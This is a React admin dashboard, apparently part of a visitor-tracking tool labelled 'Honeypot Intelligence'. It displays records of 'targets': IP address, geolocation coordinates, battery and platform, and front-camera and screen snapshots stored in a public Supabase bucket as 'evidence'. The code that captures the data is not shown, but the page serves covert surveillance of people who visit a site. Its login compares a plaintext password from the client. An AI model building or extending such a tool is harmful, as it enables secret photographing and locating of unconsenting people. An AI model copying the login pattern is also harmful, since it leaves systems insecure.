import React, { useEffect, useState } from 'react';
import { supabase } from '../supabaseClient';
import { LayoutDashboard, LogOut, Smartphone, Monitor, Battery, MapPin, Camera, Image as ImageIcon, Search, Lock } from 'lucide-react';

function Admin() {
    const [data, setData] = useState([]);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState(null);
    const [isAuthenticated, setIsAuthenticated] = useState(false);
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [loginError, setLoginError] = useState('');

    const handleLogin = async (e) => {
        e.preventDefault();
        setLoginError('');

        try {
            const { data, error } = await supabase
                .from('admins')
                .select('*')
                .eq('username', username)
                .eq('password', password) // In production, verify hash!
                .single();

            if (error || !data) {
                setLoginError('Invalid credentials');
            } else {
                setIsAuthenticated(true);
                fetchData();
            }
        } catch (err) {
            setLoginError('Login failed');
        }
    };

    const fetchData = async () => {
        setLoading(true);
        try {
            const { data: visits, error } = await supabase
                .from('visits')
                .select('*')
                .order('created_at', { ascending: false });

            if (error) throw error;
            setData(visits);
        } catch (err) {
            setError(err.message);
        } finally {
            setLoading(false);
        }
    };

    if (!isAuthenticated) {
        return (
            <div className="min-h-screen flex items-center justify-center bg-[#0f172a] text-white overflow-hidden relative">
                <div className="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1451187580459-43490279c0fa?q=80&w=2072&auto=format&fit=crop')] bg-cover opacity-20 blur-sm"></div>

                <form onSubmit={handleLogin} className="relative z-10 flex flex-col space-y-6 p-10 bg-white/10 backdrop-blur-xl rounded-2xl border border-white/20 shadow-2xl w-full max-w-md">
                    <div className="text-center mb-4">
                        <div className="mx-auto w-16 h-16 bg-blue-500/20 rounded-full flex items-center justify-center mb-4 border border-blue-500/50">
                            <Lock className="text-blue-400" size={32} />
                        </div>
                        <h2 className="text-3xl font-bold tracking-tight">Admin Access</h2>
                        <p className="text-gray-400 text-sm mt-2">Secure Gateway Login</p>
                    </div>

                    {loginError && (
                        <div className="bg-red-500/20 border border-red-500/50 text-red-200 p-3 rounded text-sm text-center">
                            {loginError}
                        </div>
                    )}

                    <div className="space-y-4">
                        <div>
                            <label className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-1 block">Username</label>
                            <input
                                type="text"
                                value={username}
                                onChange={(e) => setUsername(e.target.value)}
                                className="w-full bg-black/40 border border-gray-600 rounded-lg px-4 py-3 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none transition-all placeholder-gray-600"
                                placeholder="admin"
                            />
                        </div>
                        <div>
                            <label className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-1 block">Password</label>
                            <input
                                type="password"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                className="w-full bg-black/40 border border-gray-600 rounded-lg px-4 py-3 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none transition-all placeholder-gray-600"
                                placeholder="••••••••"
                            />
                        </div>
                    </div>

                    <button type="submit" className="bg-gradient-to-r from-blue-600 to-violet-600 hover:from-blue-500 hover:to-violet-500 text-white font-bold py-3.5 rounded-lg shadow-lg transform transition active:scale-[0.98]">
                        Authenticate
                    </button>
                </form>
            </div>
        )
    }

    return (
        <div className="min-h-screen bg-[#0f172a] text-slate-200 font-sans selection:bg-blue-500/30">

            {/* Top Navigation */}
            <nav className="sticky top-0 z-50 bg-[#0f172a]/80 backdrop-blur-md border-b border-white/10 px-6 py-4 flex justify-between items-center">
                <div className="flex items-center space-x-3">
                    <LayoutDashboard className="text-blue-400" />
                    <h1 className="text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-blue-400 to-violet-400">
                        Honeypot Intelligence
                    </h1>
                </div>
                <button onClick={() => setIsAuthenticated(false)} className="flex items-center space-x-2 text-sm font-medium text-gray-400 hover:text-white transition-colors">
                    <LogOut size={16} />
                    <span>Logout</span>
                </button>
            </nav>

            <div className="max-w-7xl mx-auto p-6 md:p-8">

                {/* Stats Summary */}
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
                    <div className="bg-white/5 border border-white/10 rounded-xl p-6 relative overflow-hidden group hover:border-blue-500/50 transition-all">
                        <div className="absolute right-0 top-0 p-4 opacity-10 group-hover:scale-110 transition-transform">
                            <Monitor size={64} />
                        </div>
                        <h3 className="text-gray-400 text-sm font-medium">Total Interceptions</h3>
                        <p className="text-4xl font-bold mt-2 text-white">{data.length}</p>
                    </div>
                    <div className="bg-white/5 border border-white/10 rounded-xl p-6 relative overflow-hidden group hover:border-purple-500/50 transition-all">
                        <div className="absolute right-0 top-0 p-4 opacity-10 group-hover:scale-110 transition-transform">
                            <Camera size={64} />
                        </div>
                        <h3 className="text-gray-400 text-sm font-medium">Images Captured</h3>
                        <p className="text-4xl font-bold mt-2 text-white">
                            {data.filter(d => d.camera_snapshot_url).length}
                        </p>
                    </div>
                    <div className="bg-white/5 border border-white/10 rounded-xl p-6 relative overflow-hidden group hover:border-emerald-500/50 transition-all">
                        <div className="absolute right-0 top-0 p-4 opacity-10 group-hover:scale-110 transition-transform">
                            <Smartphone size={64} />
                        </div>
                        <h3 className="text-gray-400 text-sm font-medium">Mobile Targets</h3>
                        <p className="text-4xl font-bold mt-2 text-white">
                            {data.filter(d => d.device_type === 'Mobile').length}
                        </p>
                    </div>
                </div>

                {loading ? (
                    <div className="flex justify-center py-20">
                        <div className="w-8 h-8 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                    </div>
                ) : error ? (
                    <div className="text-red-400 bg-red-900/20 p-4 rounded border border-red-900/50">{error}</div>
                ) : (
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                        {data.map((visit) => (
                            <div key={visit.id} className="bg-slate-800/50 backdrop-blur border border-white/5 rounded-2xl overflow-hidden hover:border-white/10 transition-all shadow-xl">

                                {/* Card Header */}
                                <div className="p-5 border-b border-white/5 flex justify-between items-center bg-black/20">
                                    <div className="flex items-center space-x-3">
                                        <div className={`p-2 rounded-lg ${visit.device_type === 'Mobile' ? 'bg-purple-500/20 text-purple-400' : 'bg-blue-500/20 text-blue-400'}`}>
                                            {visit.device_type === 'Mobile' ? <Smartphone size={18} /> : <Monitor size={18} />}
                                        </div>
                                        <div>
                                            <h3 className="font-mono text-base font-bold text-white tracking-wide">{visit.ip_address}</h3>
                                            <p className="text-xs text-slate-500">{new Date(visit.created_at).toLocaleString()}</p>
                                        </div>
                                    </div>
                                    <div className="px-3 py-1 rounded-full text-xs font-semibold bg-white/5 border border-white/10">
                                        ID: #{visit.id}
                                    </div>
                                </div>

                                {/* Card Body */}
                                <div className="p-5 space-y-4">

                                    {/* Info Grid */}
                                    <div className="grid grid-cols-2 gap-4">

                                        {/* Location */}
                                        <div className="col-span-2 sm:col-span-1 bg-white/5 rounded-lg p-3 border border-white/5">
                                            <div className="flex items-center gap-2 text-emerald-400 mb-2">
                                                <MapPin size={14} />
                                                <span className="text-xs font-bold uppercase tracking-wider">Location</span>
                                            </div>
                                            {visit.geo_location ? (
                                                <div className="text-sm">
                                                    <p className="text-white font-medium">{visit.geo_location.city || 'Unknown City'}</p>
                                                    <p className="text-slate-400 text-xs">{visit.geo_location.country || 'Unknown Country'}</p>
                                                    <p className="text-slate-600 text-[10px] font-mono mt-1">{visit.geo_location.lat?.toFixed(4)}, {visit.geo_location.lng?.toFixed(4)}</p>
                                                </div>
                                            ) : <span className="text-slate-500 text-sm">N/A</span>}
                                        </div>

                                        {/* Device Stats */}
                                        <div className="col-span-2 sm:col-span-1 bg-white/5 rounded-lg p-3 border border-white/5">
                                            <div className="flex items-center gap-2 text-amber-400 mb-2">
                                                <Battery size={14} />
                                                <span className="text-xs font-bold uppercase tracking-wider">Device Health</span>
                                            </div>
                                            <div className="text-sm space-y-1">
                                                <div className="flex justify-between">
                                                    <span className="text-slate-400">Battery</span>
                                                    <span className="text-white font-mono">{visit.battery_level?.level || 'N/A'}</span>
                                                </div>
                                                <div className="flex justify-between">
                                                    <span className="text-slate-400">Platform</span>
                                                    <span className="text-white truncate max-w-[80px]" title={visit.platform}>{visit.platform}</span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    {/* Evidence Gallery */}
                                    <div>
                                        <h4 className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Evidence Captured</h4>
                                        <div className="grid grid-cols-2 gap-3">

                                            {/* Camera Shot */}
                                            <div className="relative aspect-video bg-black/40 rounded-lg overflow-hidden border border-white/5 group">
                                                {visit.camera_snapshot_url ? (
                                                    <a href={`https://rgaysqgcfvxgcnkubymz.supabase.co/storage/v1/object/public/evidence/${visit.camera_snapshot_url}`} target="_blank" rel="noopener noreferrer">
                                                        <img
                                                            src={`https://rgaysqgcfvxgcnkubymz.supabase.co/storage/v1/object/public/evidence/${visit.camera_snapshot_url}`}
                                                            alt="Cam"
                                                            className="w-full h-full object-cover opacity-60 group-hover:opacity-100 transition-all duration-300"
                                                        />
                                                        <div className="absolute top-2 right-2 bg-red-600 w-2 h-2 rounded-full animate-pulse"></div>
                                                    </a>
                                                ) : (
                                                    <div className="w-full h-full flex flex-col items-center justify-center text-slate-700">
                                                        <Camera size={20} />
                                                        <span className="text-[10px] mt-1">No Cam</span>
                                                    </div>
                                                )}
                                                <div className="absolute bottom-0 inset-x-0 bg-gradient-to-t from-black/80 to-transparent p-2">
                                                    <p className="text-[10px] text-white font-medium flex items-center gap-1"><Camera size={10} /> Front Cam</p>
                                                </div>
                                            </div>

                                            {/* Screen Shot */}
                                            <div className="relative aspect-video bg-black/40 rounded-lg overflow-hidden border border-white/5 group">
                                                {visit.screen_snapshot_url ? (
                                                    <a href={`https://rgaysqgcfvxgcnkubymz.supabase.co/storage/v1/object/public/evidence/${visit.screen_snapshot_url}`} target="_blank" rel="noopener noreferrer">
                                                        <img
                                                            src={`https://rgaysqgcfvxgcnkubymz.supabase.co/storage/v1/object/public/evidence/${visit.screen_snapshot_url}`}
                                                            alt="Screen"
                                                            className="w-full h-full object-cover opacity-60 group-hover:opacity-100 transition-all duration-300"
                                                        />
                                                    </a>
                                                ) : (
                                                    <div className="w-full h-full flex flex-col items-center justify-center text-slate-700">
                                                        <ImageIcon size={20} />
                                                        <span className="text-[10px] mt-1">No Screen</span>
                                                    </div>
                                                )}
                                                <div className="absolute bottom-0 inset-x-0 bg-gradient-to-t from-black/80 to-transparent p-2">
                                                    <p className="text-[10px] text-white font-medium flex items-center gap-1"><Monitor size={10} /> Web View</p>
                                                </div>
                                            </div>

                                        </div>
                                    </div>

                                </div>
                            </div>
                        ))}
                    </div>
                )}
            </div>
        </div>
    );
}

export default Admin;
